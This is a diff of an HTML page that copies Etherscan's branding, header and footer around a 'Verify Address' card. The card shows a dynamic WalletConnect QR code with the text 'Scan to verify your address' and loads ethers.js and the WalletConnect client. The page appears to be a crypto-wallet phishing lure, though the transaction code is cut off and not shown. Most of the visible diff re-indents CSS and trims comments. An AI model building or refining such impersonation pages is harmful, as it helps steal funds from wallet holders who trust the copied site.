@@ -13,316 +13,316 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
   <style>
-/* ===== Design tokens ===== */
-:root {
-  --white-solid: hsl(0 0% 100%);
-  --grey-93: hsl(210 16% 93%);
-  --azure-15: hsl(210 11% 15%);
-  --grey-46: hsl(208 7% 46%);
-  --grey-98: hsl(210 17% 98%);
-  --azure-12: hsl(212 74% 12%);
-  --azure-40: hsl(200 93% 40%);
-  --azure-71: hsl(210 11% 71%);
-  --cyan-32: hsl(170 100% 32%);
-  --athens-gray: hsl(220 20% 95%);
-  --geyser: hsl(210 16% 88%);
-  --punch: hsl(357 78% 55%);
-}
+    /* ===== Design tokens ===== */
+    :root {
+      --white-solid: hsl(0 0% 100%);
+      --grey-93: hsl(210 16% 93%);
+      --azure-15: hsl(210 11% 15%);
+      --grey-46: hsl(208 7% 46%);
+      --grey-98: hsl(210 17% 98%);
+      --azure-12: hsl(212 74% 12%);
+      --azure-40: hsl(200 93% 40%);
+      --azure-71: hsl(210 11% 71%);
+      --cyan-32: hsl(170 100% 32%);
+      --athens-gray: hsl(220 20% 95%);
+      --geyser: hsl(210 16% 88%);
+      --punch: hsl(357 78% 55%);
+    }
 
-html.dim {
-  --white-solid: #111a2e;
-  --grey-93: hsl(215 20% 26%);
-  --azure-15: hsl(210 17% 92%);
-  --grey-46: hsl(212 12% 66%);
-  --grey-98: #152036;
-  --azure-12: hsl(215 30% 12%);
-  --azure-40: hsl(200 93% 55%);
-  --azure-71: hsl(212 12% 55%);
-  --cyan-32: hsl(170 80% 45%);
-  --athens-gray: hsl(215 20% 26%);
-  --geyser: hsl(215 20% 30%);
-}
+    html.dim {
+      --white-solid: #111a2e;
+      --grey-93: hsl(215 20% 26%);
+      --azure-15: hsl(210 17% 92%);
+      --grey-46: hsl(212 12% 66%);
+      --grey-98: #152036;
+      --azure-12: hsl(215 30% 12%);
+      --azure-40: hsl(200 93% 55%);
+      --azure-71: hsl(212 12% 55%);
+      --cyan-32: hsl(170 80% 45%);
+      --athens-gray: hsl(215 20% 26%);
+      --geyser: hsl(215 20% 30%);
+    }
 
-html.dark {
-  --white-solid: #111111;
-  --grey-93: hsl(0 0% 20%);
-  --azure-15: hsl(0 0% 93%);
-  --grey-46: hsl(0 0% 63%);
-  --grey-98: #171717;
-  --azure-12: hsl(0 0% 5%);
-  --azure-40: hsl(200 93% 55%);
-  --azure-71: hsl(0 0% 50%);
-  --cyan-32: hsl(170 80% 45%);
-  --athens-gray: hsl(0 0% 20%);
-  --geyser: hsl(0 0% 24%);
-}
+    html.dark {
+      --white-solid: #111111;
+      --grey-93: hsl(0 0% 20%);
+      --azure-15: hsl(0 0% 93%);
+      --grey-46: hsl(0 0% 63%);
+      --grey-98: #171717;
+      --azure-12: hsl(0 0% 5%);
+      --azure-40: hsl(200 93% 55%);
+      --azure-71: hsl(0 0% 50%);
+      --cyan-32: hsl(170 80% 45%);
+      --athens-gray: hsl(0 0% 20%);
+      --geyser: hsl(0 0% 24%);
+    }
 
-html.dim body,
-html.dark body { background-color: var(--grey-98); }
+    html.dim body,
+    html.dark body { background-color: var(--grey-98); }
 
-html.dim .site-footer,
-html.dark .site-footer {
-  --azure-15: #ffffff;
-  --azure-12: #ffffff;
-}
+    html.dim .site-footer,
+    html.dark .site-footer {
+      --azure-15: #ffffff;
+      --azure-12: #ffffff;
+    }
 
-html.dim .theme-logo-default,
-html.dark .theme-logo-default { display: none; }
-html.dim .theme-logo-light,
-html.dark .theme-logo-light { display: block; }
-.theme-logo-light { display: none; }
+    html.dim .theme-logo-default,
+    html.dark .theme-logo-default { display: none; }
+    html.dim .theme-logo-light,
+    html.dark .theme-logo-light { display: block; }
+    .theme-logo-light { display: none; }
 
-/* ===== Base ===== */
-*, *::before, *::after { box-sizing: border-box; }
-html, body { margin: 0; padding: 0; }
-body {
-  font-family: Inter, system-ui, sans-serif;
-  background-color: var(--white-solid);
-  color: var(--azure-15);
-  min-height: 100vh;
-}
-a { text-decoration: none; color: inherit; }
-ul { list-style: none; margin: 0; padding: 0; }
-button { font: inherit; background: none; border: none; cursor: pointer; }
-img { display: block; }
-.icon { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; flex: none; }
-.icon-sm { width: 12px; height: 12px; }
-.icon-md { width: 16px; height: 16px; }
-.container { max-width: 1400px; margin: 0 auto; }
+    /* ===== Base ===== */
+    *, *::before, *::after { box-sizing: border-box; }
+    html, body { margin: 0; padding: 0; }
+    body {
+      font-family: Inter, system-ui, sans-serif;
+      background-color: var(--white-solid);
+      color: var(--azure-15);
+      min-height: 100vh;
+    }
+    a { text-decoration: none; color: inherit; }
+    ul { list-style: none; margin: 0; padding: 0; }
+    button { font: inherit; background: none; border: none; cursor: pointer; }
+    img { display: block; }
+    .icon { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; flex: none; }
+    .icon-sm { width: 12px; height: 12px; }
+    .icon-md { width: 16px; height: 16px; }
+    .container { max-width: 1400px; margin: 0 auto; }
 
-/* ===== Top bar ===== */
-.topbar {
-  width: 100%;
-  background-color: var(--white-solid);
-  border-bottom: 1px solid var(--grey-93);
-  padding: 8px 20px;
-}
-.topbar-inner {
-  display: flex; align-items: center; justify-content: space-between;
-  gap: 16px; padding: 0 20px;
-}
-.topbar-left { display: flex; flex: 1; align-items: center; gap: 16px; }
-.topbar-right { display: flex; flex: 1; align-items: center; justify-content: flex-end; gap: 8px; }
-.tb-group { display: flex; align-items: center; gap: 4px; }
-.t-xs { font-size: 12px; line-height: 1.33; }
-.muted { color: var(--grey-46); }
-.link-blue { color: var(--azure-40); }
-.link-blue:hover { text-decoration: underline; }
-.green { color: var(--cyan-32); }
+    /* ===== Top bar ===== */
+    .topbar {
+      width: 100%;
+      background-color: var(--white-solid);
+      border-bottom: 1px solid var(--grey-93);
+      padding: 8px 20px;
+    }
+    .topbar-inner {
+      display: flex; align-items: center; justify-content: space-between;
+      gap: 16px; padding: 0 20px;
+    }
+    .topbar-left { display: flex; flex: 1; align-items: center; gap: 16px; }
+    .topbar-right { display: flex; flex: 1; align-items: center; justify-content: flex-end; gap: 8px; }
+    .tb-group { display: flex; align-items: center; gap: 4px; }
+    .t-xs { font-size: 12px; line-height: 1.33; }
+    .muted { color: var(--grey-46); }
+    .link-blue { color: var(--azure-40); }
+    .link-blue:hover { text-decoration: underline; }
+    .green { color: var(--cyan-32); }
 
-.search-wrap { position: relative; flex: 1; }
-.search-wrap .search-icon {
-  position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
-  color: var(--azure-71); pointer-events: none;
-}
-.search-wrap input {
-  height: 36px; width: 100%;
-  border-radius: 8px; border: 1px solid var(--grey-93);
-  background-color: var(--grey-98);
-  padding: 0 80px 0 38px;
-  font-size: 14px; color: var(--azure-15);
-  font-family: inherit;
-}
-.search-wrap input::placeholder { color: var(--grey-46); }
-.search-wrap input:focus { outline: none; border-color: var(--azure-40); }
-.slash-badge {
-  position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
-  border-radius: 6px; background-color: color-mix(in srgb, var(--azure-12) 25%, transparent);
-  padding: 1px 8px; font-size: 12px; font-weight: 600; color: var(--white-solid);
-}
+    .search-wrap { position: relative; flex: 1; }
+    .search-wrap .search-icon {
+      position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
+      color: var(--azure-71); pointer-events: none;
+    }
+    .search-wrap input {
+      height: 36px; width: 100%;
+      border-radius: 8px; border: 1px solid var(--grey-93);
+      background-color: var(--grey-98);
+      padding: 0 80px 0 38px;
+      font-size: 14px; color: var(--azure-15);
+      font-family: inherit;
+    }
+    .search-wrap input::placeholder { color: var(--grey-46); }
+    .search-wrap input:focus { outline: none; border-color: var(--azure-40); }
+    .slash-badge {
+      position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+      border-radius: 6px; background-color: color-mix(in srgb, var(--azure-12) 25%, transparent);
+      padding: 1px 8px; font-size: 12px; font-weight: 600; color: var(--white-solid);
+    }
 
-.icon-btn {
-  display: flex; height: 38px; width: 38px; align-items: center; justify-content: center;
-  border-radius: 8px; border: 1px solid var(--athens-gray);
-  background-color: var(--white-solid); color: var(--azure-15);
-  transition: background-color .15s ease;
-}
-.icon-btn:hover { background-color: var(--grey-93); }
-.theme-wrap { position: relative; }
-.theme-menu {
-  position: absolute; right: 0; margin-top: 8px; width: 176px; z-index: 50;
-  overflow: hidden; border-radius: 8px; border: 1px solid var(--grey-93);
-  background-color: var(--white-solid); padding: 4px 0;
-  box-shadow: 0 10px 15px -3px rgb(0 0 0 / .1);
-}
-.theme-menu[hidden] { display: none; }
-.theme-menu button {
-  display: flex; width: 100%; align-items: center; gap: 8px;
-  padding: 8px 12px; font-size: 14px; color: var(--azure-15);
-}
-.theme-menu button:hover { background-color: var(--grey-98); }
-.theme-menu button span { flex: 1; text-align: left; }
-.theme-menu .check { color: var(--azure-40); }
-.theme-menu .check[hidden] { visibility: hidden; display: block; }
+    .icon-btn {
+      display: flex; height: 38px; width: 38px; align-items: center; justify-content: center;
+      border-radius: 8px; border: 1px solid var(--athens-gray);
+      background-color: var(--white-solid); color: var(--azure-15);
+      transition: background-color .15s ease;
+    }
+    .icon-btn:hover { background-color: var(--grey-93); }
+    .theme-wrap { position: relative; }
+    .theme-menu {
+      position: absolute; right: 0; margin-top: 8px; width: 176px; z-index: 50;
+      overflow: hidden; border-radius: 8px; border: 1px solid var(--grey-93);
+      background-color: var(--white-solid); padding: 4px 0;
+      box-shadow: 0 10px 15px -3px rgb(0 0 0 / .1);
+    }
+    .theme-menu[hidden] { display: none; }
+    .theme-menu button {
+      display: flex; width: 100%; align-items: center; gap: 8px;
+      padding: 8px 12px; font-size: 14px; color: var(--azure-15);
+    }
+    .theme-menu button:hover { background-color: var(--grey-98); }
+    .theme-menu button span { flex: 1; text-align: left; }
+    .theme-menu .check { color: var(--azure-40); }
+    .theme-menu .check[hidden] { visibility: hidden; display: block; }
 
-/* ===== Header ===== */
-.site-header {
-  position: relative; width: 100%;
-  border-bottom: 1px solid var(--grey-93);
-  background-color: var(--white-solid);
-  box-shadow: 0 5px 10px 0 rgb(151 164 175 / .05);
-}
-.site-nav {
-  display: flex; align-items: center; justify-content: space-between;
-  padding: 12px 40px;
-}
-.brand { padding-right: 16px; }
-.brand img { height: 34px; width: 150px; }
-.nav-list { display: flex; align-items: center; gap: 24px; }
-.nav-list > li { position: relative; }
-.nav-link, .nav-btn {
-  display: flex; align-items: center; gap: 4px; padding: 12px 0;
-  font-size: 14px; color: var(--azure-15); transition: color .15s ease;
-}
-.nav-link:hover, .nav-btn:hover, .nav-btn.open { color: var(--azure-40); }
-.nav-sep { font-size: 14px; color: var(--azure-71); }
-.signin { display: flex; align-items: center; gap: 6px; font-size: 14px; color: var(--azure-15); transition: color .15s ease; }
-.signin:hover { color: var(--azure-40); }
+    /* ===== Header ===== */
+    .site-header {
+      position: relative; width: 100%;
+      border-bottom: 1px solid var(--grey-93);
+      background-color: var(--white-solid);
+      box-shadow: 0 5px 10px 0 rgb(151 164 175 / .05);
+    }
+    .site-nav {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 12px 40px;
+    }
+    .brand { padding-right: 16px; }
+    .brand img { height: 34px; width: 150px; }
+    .nav-list { display: flex; align-items: center; gap: 24px; }
+    .nav-list > li { position: relative; }
+    .nav-link, .nav-btn {
+      display: flex; align-items: center; gap: 4px; padding: 12px 0;
+      font-size: 14px; color: var(--azure-15); transition: color .15s ease;
+    }
+    .nav-link:hover, .nav-btn:hover, .nav-btn.open { color: var(--azure-40); }
+    .nav-sep { font-size: 14px; color: var(--azure-71); }
+    .signin { display: flex; align-items: center; gap: 6px; font-size: 14px; color: var(--azure-15); transition: color .15s ease; }
+    .signin:hover { color: var(--azure-40); }
 
-.dropdown {
-  position: absolute; left: 0; top: 100%; z-index: 50; min-width: 280px;
-  border-radius: 0 0 6px 6px;
-  border-left: 1px solid var(--grey-93);
-  border-right: 1px solid var(--grey-93);
-  border-bottom: 1px solid var(--grey-93);
-  border-top: 3px solid var(--azure-40);
-  background-color: var(--white-solid);
-  padding: 8px 0;
-  box-shadow: 0 8px 24px rgb(0 0 0 / .12);
-}
-.dropdown[hidden] { display: none; }
-.dropdown a {
-  display: flex; align-items: center; gap: 8px; white-space: nowrap;
-  padding: 7px 20px; font-size: 13px; color: var(--azure-15);
-}
-.dropdown .divider { margin: 8px 0; border-top: 1px solid var(--azure-40); }
-.badge-pill {
-  border-radius: 999px; background-color: var(--grey-93);
-  padding: 1px 8px; font-size: 10px; font-weight: 500; color: var(--azure-40);
-}
-.badge-sq {
-  border-radius: 4px; background-color: var(--grey-93);
-  padding: 1px 6px; font-size: 10px; font-weight: 500; color: var(--azure-40);
-}
+    .dropdown {
+      position: absolute; left: 0; top: 100%; z-index: 50; min-width: 280px;
+      border-radius: 0 0 6px 6px;
+      border-left: 1px solid var(--grey-93);
+      border-right: 1px solid var(--grey-93);
+      border-bottom: 1px solid var(--grey-93);
+      border-top: 3px solid var(--azure-40);
+      background-color: var(--white-solid);
+      padding: 8px 0;
+      box-shadow: 0 8px 24px rgb(0 0 0 / .12);
+    }
+    .dropdown[hidden] { display: none; }
+    .dropdown a {
+      display: flex; align-items: center; gap: 8px; white-space: nowrap;
+      padding: 7px 20px; font-size: 13px; color: var(--azure-15);
+    }
+    .dropdown .divider { margin: 8px 0; border-top: 1px solid var(--azure-40); }
+    .badge-pill {
+      border-radius: 999px; background-color: var(--grey-93);
+      padding: 1px 8px; font-size: 10px; font-weight: 500; color: var(--azure-40);
+    }
+    .badge-sq {
+      border-radius: 4px; background-color: var(--grey-93);
+      padding: 1px 6px; font-size: 10px; font-weight: 500; color: var(--azure-40);
+    }
 
-.mega {
-  position: absolute; left: 0; right: 0; top: 100%; z-index: 40;
-  border-radius: 0 0 6px 6px;
-  border-bottom: 1px solid var(--grey-93);
-  border-top: 3px solid var(--azure-40);
-  background-color: var(--white-solid);
-  box-shadow: 0 12px 28px rgb(0 0 0 / .12);
-}
-.mega[hidden] { display: none; }
-.mega-grid {
-  display: grid; grid-template-columns: repeat(4, minmax(0, 1fr));
-  gap: 32px; padding: 32px 40px;
-}
-.mega h3 { margin: 0 0 16px; font-size: 15px; font-weight: 600; color: var(--azure-15); }
-.mega ul { display: flex; flex-direction: column; gap: 4px; }
-.mega a {
-  display: flex; align-items: center; gap: 8px;
-  padding: 7px 0; font-size: 13px; color: var(--azure-15);
-}
+    .mega {
+      position: absolute; left: 0; right: 0; top: 100%; z-index: 40;
+      border-radius: 0 0 6px 6px;
+      border-bottom: 1px solid var(--grey-93);
+      border-top: 3px solid var(--azure-40);
+      background-color: var(--white-solid);
+      box-shadow: 0 12px 28px rgb(0 0 0 / .12);
+    }
+    .mega[hidden] { display: none; }
+    .mega-grid {
+      display: grid; grid-template-columns: repeat(4, minmax(0, 1fr));
+      gap: 32px; padding: 32px 40px;
+    }
+    .mega h3 { margin: 0 0 16px; font-size: 15px; font-weight: 600; color: var(--azure-15); }
+    .mega ul { display: flex; flex-direction: column; gap: 4px; }
+    .mega a {
+      display: flex; align-items: center; gap: 8px;
+      padding: 7px 0; font-size: 13px; color: var(--azure-15);
+    }
 
-/* ===== Main ===== */
-.main {
-  background-image: linear-gradient(to top, var(--white-solid), var(--grey-98));
-  padding: 0 20px;
-}
-.main-inner { display: flex; justify-content: center; padding: 80px 0 128px; }
-.card {
-  display: flex; flex-direction: column; align-items: center;
-  width: 567px; border-radius: 12px;
-  border: 1px solid var(--grey-93);
-  background-color: var(--white-solid);
-  padding: 24px 24px 52px;
-  box-shadow: 0 8px 19.2px 0 rgb(189 197 209 / .2);
-}
-.card h1 { margin: 0; font-size: 23px; font-weight: 500; line-height: 1.2; color: var(--azure-15); }
-.card .sub { margin: 8px 0 0; font-size: 14px; color: var(--azure-15); }
-.bubble {
-  margin-top: 20px; transform: translateY(8px);
-  display: flex; align-items: center; justify-content: center;
-  border-radius: 999px; background-color: var(--grey-93);
-  padding: 8px 20px;
-}
-.bubble img { height: 20px; width: auto; }
-.qr { margin: 16px 0 48px; height: 250px; width: 250px; transform: translateY(16px); }
-.scan { margin: 0; font-size: 14px; color: var(--azure-15); }
+    /* ===== Main ===== */
+    .main {
+      background-image: linear-gradient(to top, var(--white-solid), var(--grey-98));
+      padding: 0 20px;
+    }
+    .main-inner { display: flex; justify-content: center; padding: 80px 0 128px; }
+    .card {
+      display: flex; flex-direction: column; align-items: center;
+      width: 567px; border-radius: 12px;
+      border: 1px solid var(--grey-93);
+      background-color: var(--white-solid);
+      padding: 24px 24px 52px;
+      box-shadow: 0 8px 19.2px 0 rgb(189 197 209 / .2);
+    }
+    .card h1 { margin: 0; font-size: 23px; font-weight: 500; line-height: 1.2; color: var(--azure-15); }
+    .card .sub { margin: 8px 0 0; font-size: 14px; color: var(--azure-15); }
+    .bubble {
+      margin-top: 20px; transform: translateY(8px);
+      display: flex; align-items: center; justify-content: center;
+      border-radius: 999px; background-color: var(--grey-93);
+      padding: 8px 20px;
+    }
+    .bubble img { height: 20px; width: auto; }
+    .qr { margin: 16px 0 48px; height: 250px; width: 250px; transform: translateY(16px); }
+    .scan { margin: 0; font-size: 14px; color: var(--azure-15); }
 
-/* ===== Nouveaux styles pour le QR design ===== */
-#qr-wrapper {
-  position: relative;
-  width: 250px;
-  height: 250px;
-}
+    /* ===== Styles pour le QR design ===== */
+    #qr-wrapper {
+      position: relative;
+      width: 250px;
+      height: 250px;
+    }
 
-#qr-code {
-  position: absolute;
-  inset: 0;
-}
+    #qr-code {
+      position: absolute;
+      inset: 0;
+    }
 
-#logo-box {
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  width: 50px;
-  height: 50px;
-  background: #ffffff;
-  border-radius: 14px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
+    #logo-box {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 50px;
+      height: 50px;
+      background: #ffffff;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-#logo-box svg {
-  width: 42px;
-  height: 42px;
-  display: block;
-}
+    #logo-box svg {
+      width: 42px;
+      height: 42px;
+      display: block;
+    }
 
-/* ===== Footer ===== */
-.site-footer { width: 100%; background-color: var(--grey-98); padding: 0 20px; }
-.footer-inner { max-width: 1400px; margin: 0 auto; padding: 0 20px; }
-.footer-top { display: flex; align-items: center; justify-content: space-between; padding: 24px 0; }
-.socials { display: flex; gap: 8px; }
-.socials a {
-  display: flex; height: 32px; width: 32px; align-items: center; justify-content: center;
-  border-radius: 16px; border: 1px solid var(--athens-gray);
-  background-color: var(--athens-gray); transition: background-color .15s ease;
-}
-.socials a:hover { background-color: var(--geyser); }
-.back-top { display: flex; align-items: center; gap: 4px; font-size: 14px; color: var(--azure-12); }
-.back-top:hover { text-decoration: underline; }
+    /* ===== Footer ===== */
+    .site-footer { width: 100%; background-color: var(--grey-98); padding: 0 20px; }
+    .footer-inner { max-width: 1400px; margin: 0 auto; padding: 0 20px; }
+    .footer-top { display: flex; align-items: center; justify-content: space-between; padding: 24px 0; }
+    .socials { display: flex; gap: 8px; }
+    .socials a {
+      display: flex; height: 32px; width: 32px; align-items: center; justify-content: center;
+      border-radius: 16px; border: 1px solid var(--athens-gray);
+      background-color: var(--athens-gray); transition: background-color .15s ease;
+    }
+    .socials a:hover { background-color: var(--geyser); }
+    .back-top { display: flex; align-items: center; gap: 4px; font-size: 14px; color: var(--azure-12); }
+    .back-top:hover { text-decoration: underline; }
 
-.footer-cols { display: flex; flex-wrap: wrap; justify-content: space-between; gap: 24px; padding: 40px 0; }
-.footer-brand { display: flex; width: 460px; flex-direction: column; gap: 12px; padding-right: 32px; }
-.footer-brand .row { display: flex; align-items: center; gap: 8px; }
-.footer-brand .row img { height: 32px; width: 20px; }
-.footer-brand .row p { margin: 0; font-size: 18px; color: var(--azure-15); }
-.footer-desc { margin: 0; font-size: 12px; line-height: normal; color: var(--azure-15); }
-.footer-desc span { white-space: nowrap; }
-.footer-col { width: 240px; }
-.footer-col > p { margin: 0; font-size: 14px; font-weight: 500; line-height: 1.2; color: var(--azure-15); }
-.footer-col ul { margin-top: 16px; display: flex; flex-direction: column; gap: 12px; }
-.footer-col li { display: flex; align-items: center; gap: 8px; }
-.footer-col a { font-size: 12px; color: var(--azure-12); }
-.footer-col a:hover { color: var(--azure-40); text-decoration: underline; }
-.hiring {
-  border-radius: 800px; background-color: var(--azure-40);
-  padding: 2px 8px; font-size: 12px; font-weight: 500; color: var(--white-solid);
-}
-.footer-bottom {
-  display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between;
-  border-top: 1px solid var(--grey-93); padding: 16px 0;
-}
-.footer-bottom p { margin: 0; font-size: 12px; color: var(--azure-15); }
-.donations { display: flex; align-items: center; gap: 4px; font-size: 12px; color: var(--azure-15); }
-.donations a { font-size: 12px; color: var(--azure-40); }
-.donations a:hover { text-decoration: underline; }
-.heart { margin-left: 4px; width: 12px; height: 12px; fill: var(--punch); stroke: var(--punch); }
+    .footer-cols { display: flex; flex-wrap: wrap; justify-content: space-between; gap: 24px; padding: 40px 0; }
+    .footer-brand { display: flex; width: 460px; flex-direction: column; gap: 12px; padding-right: 32px; }
+    .footer-brand .row { display: flex; align-items: center; gap: 8px; }
+    .footer-brand .row img { height: 32px; width: 20px; }
+    .footer-brand .row p { margin: 0; font-size: 18px; color: var(--azure-15); }
+    .footer-desc { margin: 0; font-size: 12px; line-height: normal; color: var(--azure-15); }
+    .footer-desc span { white-space: nowrap; }
+    .footer-col { width: 240px; }
+    .footer-col > p { margin: 0; font-size: 14px; font-weight: 500; line-height: 1.2; color: var(--azure-15); }
+    .footer-col ul { margin-top: 16px; display: flex; flex-direction: column; gap: 12px; }
+    .footer-col li { display: flex; align-items: center; gap: 8px; }
+    .footer-col a { font-size: 12px; color: var(--azure-12); }
+    .footer-col a:hover { color: var(--azure-40); text-decoration: underline; }
+    .hiring {
+      border-radius: 800px; background-color: var(--azure-40);
+      padding: 2px 8px; font-size: 12px; font-weight: 500; color: var(--white-solid);
+    }
+    .footer-bottom {
+      display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between;
+      border-top: 1px solid var(--grey-93); padding: 16px 0;
+    }
+    .footer-bottom p { margin: 0; font-size: 12px; color: var(--azure-15); }
+    .donations { display: flex; align-items: center; gap: 4px; font-size: 12px; color: var(--azure-15); }
+    .donations a { font-size: 12px; color: var(--azure-40); }
+    .donations a:hover { text-decoration: underline; }
+    .heart { margin-left: 4px; width: 12px; height: 12px; fill: var(--punch); stroke: var(--punch); }
   </style>
 </head>
 <body id="top">
@@ -342,7 +342,6 @@ img { display: block; }
           <a class="t-xs link-blue" href="https://etherscan.io/gastracker">0.206 Gwei</a>
         </div>
       </div>
-
       <div class="topbar-right">
         <div class="search-wrap">
           <svg class="icon search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
@@ -386,7 +385,7 @@ img { display: block; }
         <div class="bubble">
           <img src="assets/clip-path-group.png" alt="Etherscan" />
         </div>
-        <!-- QR DYNAMIQUE (remplace l'image statique) -->
+        <!-- QR DYNAMIQUE -->
         <div id="qrcode" class="qr"></div>
         <p class="scan">Scan to verify your address</p>
       </div>
@@ -487,486 +486,476 @@ img { display: block; }
     </div>
   </footer>
 
-  <!-- CDN nécessaires -->
+  <!-- CDN -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.2.0/dist/ethers.umd.min.js"></script>
-  <!-- Remplacer qrcodejs par qr-code-styling -->
   <script src="https://cdn.jsdelivr.net/npm/qr-code-styling@1/lib/qr-code-styling.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.9.0/dist/index.umd.js"></script>
 
   <script>
-/* =========================================================
-   Etherscan – Verify Address (static HTML/CSS/JS version)
-   ========================================================= */
+    // ===== Icônes (identique à la version précédente) =====
+    const ICONS = {
+      chevronDown: '<path d="m6 9 6 6 6-6"/>',
+      userCircle: '<circle cx="12" cy="12" r="10"/><circle cx="12" cy="10" r="3"/><path d="M7 20.7a8 8 0 0 1 10 0"/>',
+      externalLink: '<path d="M15 3h6v6"/><path d="M10 14 21 3"/><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/>',
+      fileInput: '<path d="M4 22h14a2 2 0 0 0 2-2V7l-5-5H6a2 2 0 0 0-2 2v4"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M2 15h10"/><path d="m9 18 3-3-3-3"/>',
+      fileCode: '<path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7z"/><path d="m9 18 3-3-3-3"/>',
+      refresh: '<path d="M21 12a9 9 0 1 1-3-6.7L21 8"/><path d="M21 3v5h-5"/>',
+      download: '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m7 10 5 5 5-5"/><path d="M12 15V3"/>',
+      wallet: '<path d="M19 7V5a2 2 0 0 0-2-2H5a2 2 0 0 0 0 4h15a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5"/><path d="M18 12h.01"/>',
+      send: '<path d="m22 2-7 20-4-9-9-4Z"/><path d="M22 2 11 13"/>',
+      binary: '<rect x="14" y="14" width="6" height="6" rx="1"/><rect x="4" y="4" width="6" height="6" rx="1"/><path d="M4 20h6M14 4h6M14 10h6M4 14h6"/>',
+      code: '<path d="m18 16 4-4-4-4"/><path d="m6 8-4 4 4 4"/><path d="m14.5 4-5 16"/>',
+      fileCheck: '<path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7z"/><path d="m9 15 2 2 4-4"/>',
+      search: '<circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>',
+      searchCode: '<path d="m9 9-2 2 2 2"/><path d="m13 13 2-2-2-2"/><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>',
+      gitCompare: '<circle cx="18" cy="18" r="3"/><circle cx="6" cy="6" r="3"/><path d="M13 6h3a2 2 0 0 1 2 2v7"/><path d="M11 18H8a2 2 0 0 1-2-2V9"/>',
+      fileTerminal: '<path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7z"/><path d="m8 16 2-2-2-2"/><path d="M12 18h4"/>',
+      fuel: '<path d="M3 22h12V4a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2Z"/><path d="M3 12h12"/><path d="M18 8v9a2 2 0 0 0 4 0V9l-3-3"/>',
+      swap: '<path d="M8 3 4 7l4 4"/><path d="M4 7h16"/><path d="m16 21 4-4-4-4"/><path d="M20 17H4"/>',
+      server: '<rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><path d="M6 6h.01M6 18h.01"/>',
+      tags: '<path d="m15 5 6 6-7 7-6-6V5Z"/><path d="M10 9h.01"/>',
+      globe: '<circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15 15 0 0 1 0 20a15 15 0 0 1 0-20"/>',
+      shieldCheck: '<path d="M20 13c0 5-3.5 7.5-8 9-4.5-1.5-8-4-8-9V6l8-3 8 3Z"/><path d="m9 12 2 2 4-4"/>',
+      penLine: '<path d="M12 20h9"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4Z"/>',
+      message: '<path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2Z"/>',
+      filter: '<path d="M22 3H2l8 9.5V19l4 2v-8.5Z"/>',
+      messages: '<path d="M14 9a2 2 0 0 1-2 2H6l-4 4V4a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2Z"/><path d="M18 9h2a2 2 0 0 1 2 2v11l-4-4h-6a2 2 0 0 1-2-2v-1"/>',
+      sun: '<circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M6.3 17.7l-1.4 1.4M19.1 4.9l-1.4 1.4"/>',
+      moon: '<path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/>',
+      moonStar: '<path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/><path d="M19 3v4M17 5h4"/>',
+      monitor: '<rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/>',
+      check: '<path d="M20 6 9 17l-5-5"/>',
+    };
 
-/* ---------- Icônes (style Lucide, stroke currentColor) ---------- */
-const ICONS = {
-  chevronDown: '<path d="m6 9 6 6 6-6"/>',
-  userCircle: '<circle cx="12" cy="12" r="10"/><circle cx="12" cy="10" r="3"/><path d="M7 20.7a8 8 0 0 1 10 0"/>',
-  externalLink: '<path d="M15 3h6v6"/><path d="M10 14 21 3"/><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/>',
